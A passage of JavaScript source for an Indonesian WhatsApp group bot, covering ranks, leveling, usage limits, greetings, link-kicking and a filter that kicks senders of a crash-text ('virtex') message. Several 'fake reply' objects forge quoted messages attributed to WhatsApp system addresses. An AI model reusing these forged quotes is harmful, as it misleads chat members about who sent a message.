    '🐡 : 🐭 : 🐋 YOU LOSE',
    '🐭 : 🐬 : 🐶 YOU LOSE',
    '🦄 : 🦄 : 🦄 YOU WIN',
    '🦘 : 🐬 : 🦥 YOU LOSE',
    '🐡 : 🐠 : 🦄 YOU LOSE',
    '🦀 : 🦀 : 🦀 YOU WIN',
    '🦀 : 🐬 : 🐠 YOU LOSE',
    '🦋 : 🐜 : 🐋 YOU LOSE',
    '🐡 : 🐞 : 🐌 YOU LOSE',
    '🐜 : 🐞 : 🐌 YOU LOSE',
    '🐘 : 🐬 : 🐋 YOU LOSE',
    '🐡 : 🐃 : 🐋 YOU LOSE',
    '🐡 : 🐬 : 🦏 YOU LOSE',
    '🦏 : 🐘 : 🐃 YOU LOSE',
    '🐜 : 🦂 : 🦏 YOU LOSE'
  ]          
  
           
            /// SCURITY FEATURE /////
     
            const isEventon = isGroup ? event.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
            const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
           const hour_now = moment().format('HH:mm:ss')
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const isBadWord = isGroup ? badword.includes(from) : false
            const isAntiFirtex= isGroup ? antifirtex.includes(from) : false
            const isAntiFirtex2= isGroup ? antifirtex2.includes(from) : false
            const isAntiFirtex3= isGroup ? antifirtex3.includes(from) : false
            const isAntiFirtex4= isGroup ? antifirtex4.includes(from) : false
            const isAntiFirtex5= isGroup ? antifirtex5.includes(from) : false
            const isAntiFirtex6= isGroup ? antifirtex6.includes(from) : false
			const isBanned = ban.includes(sender)
			const isOwner = ownerNumber.includes(sender)
			const isPrem = prem.includes(sender) || isOwner
			const isImage = type === 'imageMessage'
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=])/, 'gi'))
			}
			const reply = (teks) => {
				aldi.sendMessage(from, teks, text, {quoted: mek})
			}
			const sendMess = (hehe, teks) => {
				aldi.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? aldi.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : aldi.sendMessage(from, teks.trim(), extendedText, {quoted: ftoko, contextInfo: {"mentionedJid": memberr}})
			}
			const sendImage = (teks) => {
		    aldi.sendMessage(from, teks, image, {quoted: mek})
		    }
		    const costum = (pesan, tipe, target, target2) => {
			aldi.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
		    const senalditt = (teks) => {
		    aldi.sendMessage(from, audio, mp3, {quoted: mek})
		    }
		   //PERSENTASE RANKING BY ARIFI RAZZAQ OFFICIAL
const bares = getLevelingLevel(sender)

			var bars = `*[▒▒▒▒▒▒▒▒▒▒] ${bares}%*`
			if (bares <= 10) {

				bars = `*[█▒▒▒▒▒▒▒▒▒] ${bares}%*`

			} else if (bares <= 20) {

				bars = `*[██▒▒▒▒▒▒▒▒] ${bares}%*`

			} else if (bares <= 30) {

				bars = `*[███▒▒▒▒▒▒▒] ${bares}%*`

			} else if (bares <= 40) {

				bars = `*[████▒▒▒▒▒▒] ${bares}%*`

			} else if (bares <= 50) {

				bars = `*[█████▒▒▒▒▒] ${bares}%*`

			} else if (bares <= 60) {

				bars = `*[██████▒▒▒▒] ${bares}%*`

			} else if (bares <= 70) {

				bars = `*[███████▒▒▒] ${bares}%*`

			} else if (bares <= 80) {

				bars = `*[████████▒▒] ${bares}%*`

			} else if (bares <= 90) {

				bars = `*[█████████▒] ${bares}%*`

			} else if (bares <= 100) {

				bars = `*[██████████] ${bares}%*`

			} else if (bares <= 110) {

				bars = `*[██████████]+1 ${bares}%*`

			} else if (bares <= 120) {

				bars = `*[██████████]+2 ${bares}%*`
				
			} else if (bares <= 130) {

				bars = `*[██████████]+3 ${bares}%*`
			
			} else if (bares <= 140) {

				bars = `*[██████████]+4 ${bares}%*`

			} else if (bares <= 150) {

				bars = `*[██████████]+5 ${bares}%*`
				
			} else if (bares <= 160) {

				bars = `*[██████████]+6 ${bares}%*`
			} else if (bares <= 170) {

				bars = `*[██████████]+7 ${bares}%*`

			} else if (bares <= 180) {

				bars = `*[██████████]+8 ${bares}%*`
				
			} else if (bares <= 190) {

				bars = `*[██████████]+9 ${bares}%*`
				
			} else if (bares <= 110) {

				bars = `*[██████████]+10 ${bares}%*`

			} else if (bares <= 99999999999999) {

				bars = `*[██████████]+上帝 ${bares}%*`
            }
   //BY ITSME ALDI
	if (isBadWord) {
   sistem = 'Aktif'
   }
   if (!isBadWord) {
   sistem = 'Nonaktif'
   } 
   if (isAntiLink) {
   sistem1 = 'Aktif'
   }
   if (!isAntiLink) {
   sistem1 = 'Nonaktif'
   }
   if (isNsfw) {
   sistem6 = 'Aktif'
   }
   if (!isNsfw) {
   sistem6 = 'Nonaktif'
   }
   if (isSimi) {
   sistem2 = 'Aktif'
   }
   if (!isSimi) {
   sistem2 = 'Nonaktif'
   }
   if (isWelkom) {
   sistem3 = 'Aktif'
   }
   if (!isWelkom) {
   sistem3 = 'Nonaktif'
   }
   if (isLevelingOn) {
   sistem4 = 'Aktif'
   }
   if (!isLevelingOn) {
   sistem4 = 'Nonaktif'
   }
   if (isRegistered) {
   sistem100 = 'Udh Registrasi'
   }
   if (!isRegistered) {
   sistem100 = 'Blum Registrasi'
   }
   //role level
        const levelRole = getLevelingLevel(sender)
        var role = 'Newbie ㋡'
        if (levelRole <= 2) {
            role = 'Newbie ㋡'
        } else if (levelRole <= 4) {
            role = 'Beginner Grade 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Beginner Grade 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Beginner Grade 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Beginner Grade 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Private Grade 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Private Grade 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Private Grade 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Private Grade 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Private Grade 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Corporal Grade 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Corporal Grade 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Corporal Grade 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Corporal Grade 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Corporal Grade 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Sergeant Grade 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Sergeant Grade 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Sergeant Grade 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Sergeant Grade 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Sergeant Grade 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Staff Grade 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Staff Grade 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Staff Grade 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Staff Grade 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Sergeant Grade 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Sergeant Grade 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Sergeant Grade 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Sergeant Grade 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = '2nd Lt. Grade 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = '2nd Lt. Grade 2 ♢²'
        } else if (levelRole <= 66) {
            role = '2nd Lt. Grade 3 ♢³'
        } else if (levelRole <= 68) {
            role = '2nd Lt. Grade 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = '1st Lt. Grade 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = '1st Lt. Grade 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = '1st Lt. Grade 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = '1st Lt. Grade 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Major Grade 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Major Grade 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Major Grade 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Major Grade 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Colonel Grade 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Colonel Grade 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Colonel Grade 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Colonel Grade 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Colonel Grade 5 ✷✷⁵'
        } else if (levelRole <= 102) {
            role = 'Brigadier Early ✰'
        } else if (levelRole <= 104) {
            role = 'Brigadier Silver ✩'
        } else if (levelRole <= 106) {
            role = 'Brigadier gold ✯'
        } else if (levelRole <= 108) {
            role = 'Brigadier Platinum ✬'
        } else if (levelRole <= 110) {
            role = 'Brigadier Diamond ✪'
        } else if (levelRole <= 112) {
            role = 'Major General Early ✰'
        } else if (levelRole <= 114) {
            role = 'Major General Silver ✩'
        } else if (levelRole <= 116) {
            role = 'Major General gold ✯'
        } else if (levelRole <= 118) {
            role = 'Major General Platinum ✬'
        } else if (levelRole <= 120) {
            role = 'Major General Diamond ✪'
        } else if (levelRole <= 122) {
            role = 'Lt. General Early ✰'
        } else if (levelRole <= 124) {
            role = 'Lt. General Silver ✩'
        } else if (levelRole <= 126) {
            role = 'Lt. General gold ✯'
        } else if (levelRole <= 128) {
            role = 'Lt. General Platinum ✬'
        } else if (levelRole <= 130) {
            role = 'Lt. General Diamond ✪'
        } else if (levelRole <= 132) {
            role = 'General Early ✰'
        } else if (levelRole <= 134) {
            role = 'General Silver ✩'
        } else if (levelRole <= 136) {
            role = 'General gold ✯'
        } else if (levelRole <= 138) {
            role = 'General Platinum ✬'
        } else if (levelRole <= 140) {
            role = 'General Diamond ✪'
        } else if (levelRole <= 142) {
            role = 'Commander Early ★'
        } else if (levelRole <= 144) {
            role = 'Commander Intermediate ⍣'
        } else if (levelRole <= 146) {
            role = 'Commander Elite ≛'
        } else if (levelRole <= 148) {
            role = 'The Commander Hero ⍟'
        } else if (levelRole <= 152) {
            role = 'Legends 忍'
        } else if (levelRole <= 154) {
            role = 'Legends 忍'
        } else if (levelRole <= 156) {
            role = 'Legends 忍'
        } else if (levelRole <= 158) {
            role = 'Legends 忍'
        } else if (levelRole <= 160) {
            role = 'Legends 忍'
        } else if (levelRole <= 162) {
            role = 'Legends 忍'
        } else if (levelRole <= 164) {
            role = 'Legends 忍'
        } else if (levelRole <= 166) {
            role = 'Legends 忍'
        } else if (levelRole <= 168) {
            role = 'Legends 忍'
        } else if (levelRole <= 170) {
            role = 'Legends 忍'
        } else if (levelRole <= 172) {
            role = 'Legends 忍'
        } else if (levelRole <= 174) {
            role = 'Legends 忍'
        } else if (levelRole <= 176) {
            role = 'Legends 忍'
        } else if (levelRole <= 178) {
            role = 'Legends 忍'
        } else if (levelRole <= 180) {
            role = 'Legends 忍'
        } else if (levelRole <= 182) {
            role = 'Legends 忍'
        } else if (levelRole <= 184) {
            role = 'Legends 忍'
        } else if (levelRole <= 186) {
            role = 'Legends 忍'
        } else if (levelRole <= 188) {
            role = 'Legends 忍'
        } else if (levelRole <= 190) {
            role = 'Legends 忍'
        } else if (levelRole <= 192) {
            role = 'Legends 忍'
        } else if (levelRole <= 194) {
            role = 'Legends 忍'
        } else if (levelRole <= 196) {
            role = 'Legends 忍'
        } else if (levelRole <= 198) {
            role = 'Legends 忍'
        } else if (levelRole <= 200) {
            role = 'Legends 忍'
        } else if (levelRole <= 210) {
            role = 'Legends 忍'
        } else if (levelRole <= 220) {
            role = 'Legends 忍'
        } else if (levelRole <= 230) {
            role = 'Legends 忍'
        } else if (levelRole <= 240) {
            role = 'Legends 忍'
        } else if (levelRole <= 250) {
            role = 'Legends 忍'
        } else if (levelRole <= 260) {
            role = 'Legends 忍'
        } else if (levelRole <= 270) {
            role = 'Legends 忍'
        } else if (levelRole <= 280) {
            role = 'Legends 忍'
        } else if (levelRole <= 290) {
            role = 'Legends 忍'
        } else if (levelRole <= 300) {
            role = 'Legends 忍'
        } else if (levelRole <= 310) {
            role = 'Legends 忍'
        } else if (levelRole <= 320) {
            role = 'Legends 忍'
        } else if (levelRole <= 330) {
            role = 'Legends 忍'
        } else if (levelRole <= 340) {
            role = 'Legends 忍'
        } else if (levelRole <= 350) {
            role = 'Legends 忍'
        } else if (levelRole <= 360) {
            role = 'Legends 忍'
        } else if (levelRole <= 370) {
            role = 'Legends 忍'
        } else if (levelRole <= 380) {
            role = 'Legends 忍'
        } else if (levelRole <= 390) {
            role = 'Legends 忍'
        } else if (levelRole <= 400) {
            role = 'Legends 忍'
        } else if (levelRole <= 410) {
            role = 'Legends 忍'
        } else if (levelRole <= 420) {
            role = 'Legends 忍'
        } else if (levelRole <= 430) {
            role = 'Legends 忍'
        } else if (levelRole <= 440) {
            role = 'Legends 忍'
        } else if (levelRole <= 450) {
            role = 'Legends 忍'
        } else if (levelRole <= 460) {
            role = 'Legends 忍'
        } else if (levelRole <= 470) {
            role = 'Legends 忍'
        } else if (levelRole <= 480) {
            role = 'Legends 忍'
        } else if (levelRole <= 490) {
            role = 'Legends 忍'
        } else if (levelRole <= 500) {
            role = 'Legends 忍'
        } else if (levelRole <= 600) {
            role = 'Legends 忍'
        } else if (levelRole <= 700) {
            role = 'Legends 忍'
        } else if (levelRole <= 800) {
            role = 'Legends 忍'
        } else if (levelRole <= 900) {
            role = 'Legends 忍'
        } else if (levelRole <= 1000) {
            role = 'Legends 忍'
        } else if (levelRole <= 2000) {
            role = 'Legends 忍'
        } else if (levelRole <= 3000) {
            role = 'Legends 忍'
        } else if (levelRole <= 4000) {
            role = 'Legends 忍'
        } else if (levelRole <= 5000) {
            role = 'Legends 忍'
        } else if (levelRole <= 6000) {
            role = 'Legends 忍'
        } else if (levelRole <= 7000) {
            role = 'Legends 忍'
        } else if (levelRole <= 8000) {
            role = 'Legends 忍'
        } else if (levelRole <= 9000) {
            role = 'Legends 忍'
        } else if (levelRole <= 10000) {
            role = 'Legends 忍'
        }
dpa = {
			wait: `⏳Wait Sedang Proses`,
			succes: `✅Sukses Ngab!!!`,
			error: `❎Error Ngab!!!`,
			lvlon: `✅Berhasil Mengaktifkan Mode Leveling Di Group Iniï`,
			lvloff: `‼️Berhasil Menonaktifkan Mode Leveling Di Group Iniï`,
			lvlnul: `⭕Level Mu Masih Kosong`,
			}
    premi = '*USER BIASA*'
			    if (isPrem) {
			    premi = '*USER PREMIUM*'
			    } 
			    if (isOwner) {
			    premi = '*UNLIMITED PREMIUM*'
			    }
aml = {
			succes: `「 ❗ 」Sukses Ngab!!!`,
			wait: `⏳\`\`\`Wait Sedang Menghubungkan Ke Server!!!\`\`\``,
			error: `「 ❗ 」Error Ngab!!!`,
			lvlon: `「 ❗ 」Berhasil Mengaktifkan Mode Leveling Di Group Ini️`,
			lvloff: `「 ❗ 」Berhasil Menonaktifkan Mode Leveling Di Group Ini️`,
			lvlnul: `「 ❗ 」Level Mu Masih Kosong`,
			baned: `「 ❗ 」Maaf Kamu Sudah Terbanned!!`,
			Iv: ` Linknya error:v`,
			noregis: `「 ❎ 」Anda Belum Terdaftar Di Database ALPHABOT Silahkan Daftar Terlebih Dahulu Dengan Ketik ${prefix}daftar`,
			lvlnoon: `「 ❗ 」Leveling Di Group Belum Diaktifkan`,
			rediregis: `「 ❗ 」Kamu Sudah Terdaftar Di Database ${namabot}`,
			stikga: `「 ❗ 」Yah Gagal Coba Ulangi Beberapa Saat Lagi`,
			linkga: `「 ❗ 」Link Tidak Valid`,
			groupo: `「 ❗ 」 Ini Khusus Untuk Group`,
			ownerb: `「 ❗ 」 Ini Khusus Untuk Owner`,
			ownerg: `「 ❗ 」 Ini Khusus Untuk Owner Group`,
			admin: `「 ❗ 」 Ini Khusus Untuk Admin`,
			badmin: `「 ❗ 」BOT Harus Menjadi Admin`,
			nsfwoff: `「 ❗ 」Aktifkan Mode Nsfw!`,
			wrongf: `「 ❗ 」Format Salah/Text Kosong`,
			erro: `「 ❗ 」Mungkin api 🔥 mati`,
			clears: `「 ❗ 」Clear All Succes`,
			}
 
 const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}
aldi.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log('call dari '+ callerId)
await sleep(1)
await aldi.blockUser(callerId, 'add') // Block user
})

var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = 'Minggu'; break;
                case 1: hari = 'Senin'; break;
                case 2: hari = 'Selasa'; break;
                case 3: hari = 'Rabu'; break;
                case 4: hari = 'Kamis'; break;
                case 5: hari = 'Jum`at'; break;
                case 6: hari = 'Sabtu'; break;
            }
            switch(bulan1) {
                case 0: bulan1 = 'Januari'; break;
                case 1: bulan1 = 'Februari'; break;
                case 2: bulan1 = 'Maret'; break;
                case 3: bulan1 = 'April'; break;
                case 4: bulan1 = 'Mei'; break;
                case 5: bulan1 = 'Juni'; break;
                case 6: bulan1 = 'Juli'; break;
                case 7: bulan1 = 'Agustus'; break;
                case 8: bulan1 = 'September'; break;
                case 9: bulan1 = 'Oktober'; break;
                case 10: bulan1 = 'November'; break;
                case 11: bulan1 = 'Desember'; break;
            }
            var tampilHari = '' + hari + ', ' + tanggal + ' ' + bulan1 + ' ' + tahun;
            var tampilJam = '' + jam + ':' + menit + ':' + detik + ' Wib';
      
  
	        //function leveling
            if (isGroup && !isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random()*  10) + 500
                const requiredXp = 5000* (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel))
                }
            } catch (err) {
                console.error(err)
            }
        }
               //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return aldi.sendMessage(from,`Limit request anda sudah habis\n\n_Note : Limit akan direset setiap jam 21:00!_`, text,{ quoted: fkontak})
                            aldi.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 1 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        aldi.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				const sekarang = new Date().getTime();
			var ase = new Date();
                        var waktoo = ase.getHours();
                        switch(waktoo){
                case 0: waktoo = 'Waktu Tengah Malam😴'; break;
                case 1: waktoo = 'Waktu Tengah Malam😴'; break;
                case 2: waktoo = 'Waktu Dini Hari🌟’'; break;
                case 3: waktoo = 'Waktu Dini Hari🌟“'; break;
                case 4: waktoo = 'Selamat Subuh kak🌛”'; break;
                case 5: waktoo = 'Selamat Subuh kak🌛”'; break;
                case 6: waktoo = 'Selamat Pagi kak🌝'; break;
                case 7: waktoo = 'Selamat Pagi kak🌝'; break;
                case 8: waktoo = 'Selamat Pagi kak🌝'; break;
                case 9: waktoo = 'Selamat Pagi kak🌝'; break;
                case 10: waktoo = 'Selamat Pagi kak✨'; break;
                case 11: waktoo = 'Selamat Siang Kak☀️'; break;
                case 12: waktoo = 'Selamat Siang Kak☀️'; break;
                case 13: waktoo = 'Selamat Siang Kak☀️'; break;
                case 14: waktoo = 'Selamat Siang Kak☀️'; break;
                case 15: waktoo = 'Selamat Sore Kak⛅'; break;
                case 16: waktoo = 'Selamat Sore Kak⛅'; break;
                case 17: waktoo = 'Selamat Sore Kak⛅–'; break;
                case 18: waktoo = 'Waktu Magrib??️˜'; break;
                case 19: waktoo = 'Waktu Magrib🌦️'; break;
                case 20: waktoo = 'Selamat Malam🌚'; break;
                case 21: waktoo = 'Selamat Malam🌚'; break;
                case 22: waktoo = 'Selamat Malam🌚'; break;
                case 23: waktoo = 'Tengah Malam🌚'; break;
            }
            var tampilUcapan = '' + waktoo;
            
				//buat fakereply
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam ${pushname}😴`;break;
                case 1: waktoonyabro = `Selamat Malam ${pushname}🥱`;break;
                case 2: waktoonyabro = `Selamat Malam ${pushname}🌚`;break;
                case 3: waktoonyabro = `Selamat Pagi ${pushname}🌞`;break;
                case 4: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 5: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 6: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 7: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 8: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 9: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 10: waktoonyabro = `Selamat Pagi ${pushname}🌝`;break;
                case 11: waktoonyabro = `Selamat Siang ${pushname}🌝`; break;
                case 12: waktoonyabro = `Selamat Siang ${pushname}🌞`; break;
                case 13: waktoonyabro = `Selamat Siang ${pushname}🌞`; break;
                case 14: waktoonyabro = `Selamat Siang ${pushname}🌞`;break;
                case 15: waktoonyabro = `Selamat Sore ${pushname}🌛`;break;
                case 16: waktoonyabro = `Selamat Sore ${pushname}🌛`;break;
                case 17: waktoonyabro = `Selamat Sore ${pushname}🌛`;break;
                case 18: waktoonyabro = `Selamat Malam ${pushname}🌚`;break;
                case 19: waktoonyabro = `Selamat Malam ${pushname}🌚`;break;
                case 20: waktoonyabro = `Selamat Malam ${pushname}🌚 `;break;
                case 21: waktoonyabro = `Selamat Malam ${pushname}🥱`; break;
                case 22: waktoonyabro = `Selamat Malam ${pushname}😴`; break;
                case 23: waktoonyabro = `Selamat Malam ${pushname}😴 `;break;
            }
            var ucapanFakereply = '' + waktoonyabro;
         
         
			//fake reply
			const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6283136505591-1614953337@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/png', 'caption': `${ucapanFakereply}`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')} } }
			const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'productMessage': { 'product': { 'productImage':{ 'mimetype': 'image/jpeg', 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg') }, 'title': `${ucapanFakereply}`, 'productImageCount': 9999 }, 'businessOwnerJid': `0@s.whatsapp.net`}}}
			const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${ucapanFakereply}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ucapanFakereply},;;;\nFN:${ucapanFakereply},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')}}}
			
          const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = aldi.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "KlikDisiniKak","listType": "SINGLE_SELECT","sections": list}}, {})
            return aldi.relayWAMessage(po, {waitForAck: true})
        }
			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    aldi.sendMessage(from, ind.limitend(pushname), text, {quoted: fkontak})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 1 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
       }
     }
                 
			const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
			const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
			ultah = new Date('2021','28','08').valueOf()
            tungmun = moment(ultah - Date.now()).format('DD [Hari], HH [Jam], mm [Menit], ss [Detik]')
    
        if (isCmd && antiSpam.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return reply('😒Sabar Bang 5 Detik/Command')}
        
        if (isCmd && antiSpam.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return reply('😒Sabar Bang 5 Detik/Command')
        }
            if (isCmd && !isOwner) antiSpam.addFilter(from)
            
            //function balance
            if (!isRegistered && isGroup ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random()* 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
// ANTI LINK GRUP
        if (budy.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`${pushname} Adalah Admin Group Kamu Tidak Akan Di kick`)
		aldi.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		}, 1100)
		setTimeout( () => {
		aldi.groupRemove(from, [Kick]).catch((e) => {reply(`ERROR: ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`「 *LINK GROUP TERDETEKSI* !!! 」\nANDA AKAN DI KICK DARI GROUP`)
		}, 0)
		}  
		if (budy.includes("END:VCARD")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`${pushname} Adalah Admin Group Kamu Tidak Akan Di kick`)
		aldi.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('🥺 kan ke kick sudah tau anti link lopyou babay😝🥰')
		}, 1100)
		setTimeout( () => {
		aldi.groupRemove(from, [Kick]).catch((e) => {reply(`ERROR: ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`Link Group Terdeteksi maaf ${pushname} anda akan di kick`)
		}, 0)
		}  
//ANTI VIRTEX 
       
		if (mesejAnti.includes("🧙‍♂️𝐀𝐥𝐚𝐤𝐚𝐳𝐚𝐦🔮")){
		if (!isGroup) return
		if (!isAntiFirtex2) return
		if (isGroupAdmins) return reply('ADMIN GRUP MAH BEBAS😁')
		aldi.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`VIRTEX TERDETEKSI!!! MAAF ${sender.split("@")[0]} ANDA AKAN DI KICK DARI GRUP DALAM WAKTU 5 DETIK`)
		setTimeout( () => {
			aldi.groupRemove(from, [kic]).catch((e)=>{reply(`ERR: ${e}`)})
		}, 5000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("ShenraTensei🌪️")
		}, 4000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 3000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 2000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("4detik")
		}, 1000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("5detik")
		}, 0)
	}
	
